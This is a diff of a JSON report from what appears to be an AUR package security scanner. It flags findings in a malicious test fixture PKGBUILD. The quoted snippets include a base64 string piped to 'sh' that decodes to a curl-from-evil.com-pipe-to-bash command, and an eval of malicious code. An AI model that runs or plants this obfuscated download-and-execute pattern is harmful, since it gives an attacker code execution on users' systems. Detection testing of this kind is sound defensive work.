@@ -9,7 +9,7 @@
       "title": "Decode-and-execute flow",
       "description": "The file both decodes/decompresses data and dynamically executes shell input. Together these form a decode->execute payload, even when split across lines.",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
         "line": null,
         "column": null,
         "snippet": null
@@ -27,7 +27,7 @@
       "title": "Base64 decoding",
       "description": "Base64 decoding may hide malicious payloads",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
         "line": 14,
         "column": 67,
         "snippet": "    echo \"Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==\" | base64 -d | sh"
@@ -45,7 +45,7 @@
       "title": "Base64 decoding",
       "description": "Base64 decoding may hide malicious payloads",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
         "line": 14,
         "column": 67,
         "snippet": "    echo \"Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==\" | base64 -d | sh"
@@ -63,7 +63,7 @@
       "title": "Eval usage",
       "description": "Eval can execute obfuscated malicious code",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
         "line": 17,
         "column": 5,
         "snippet": "    eval \"$MALICIOUS_CODE\""
@@ -81,7 +81,7 @@
       "title": "No sources with build function",
       "description": "Package has build() function but no source array",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
         "line": null,
         "column": null,
         "snippet": null
@@ -92,8 +92,8 @@
     }
   ],
   "scanned_files": [
-    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated/PKGBUILD"
+    "tests/fixtures/malicious/obfuscated/PKGBUILD"
   ],
-  "timestamp": "2026-06-15T01:57:16.938093409Z",
-  "scan_duration_ms": 1
+  "timestamp": "2026-06-15T10:43:30.763920458Z",
+  "scan_duration_ms": 4
 }
